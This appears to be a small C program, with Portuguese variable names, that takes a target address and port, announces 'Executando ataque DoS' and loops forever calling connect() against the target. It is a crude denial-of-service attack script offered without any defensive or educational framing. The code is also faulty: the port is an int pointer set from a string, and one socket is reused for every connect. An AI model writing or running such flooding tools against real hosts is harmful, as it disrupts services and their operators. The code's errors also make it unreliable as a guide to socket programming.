#include <stdio.h>
#include <netdb.h>

int main(int argc, char *argv[]){
	int mysocket;
	char * alvoaddress;
	int * porta;
	int conecta;

	porta = argv[2];
	alvoaddress = argv[1];

	struct sockaddr_in alvo;
	printf("antes");
	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);
	alvo.sin_addr.s_addr = inet_addr(alvoaddress);
	printf("Executando ataque DoS");
	while(1 == 1){
		conecta = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);
	}
	return 0;
	
}
